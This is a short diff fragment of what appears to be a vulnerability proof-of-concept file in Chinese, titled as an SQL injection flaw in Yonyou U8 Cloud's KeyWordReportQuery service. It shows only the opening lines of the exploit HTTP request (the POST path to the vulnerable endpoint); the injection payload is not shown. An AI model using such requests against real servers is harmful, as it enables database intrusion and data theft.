@@ -1,7 +1,7 @@
 ## 用友U8 Cloud-KeyWordReportQuery存在SQL注入漏洞
 
 
-## poc
+## POC
 ```
 POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
 Host: 
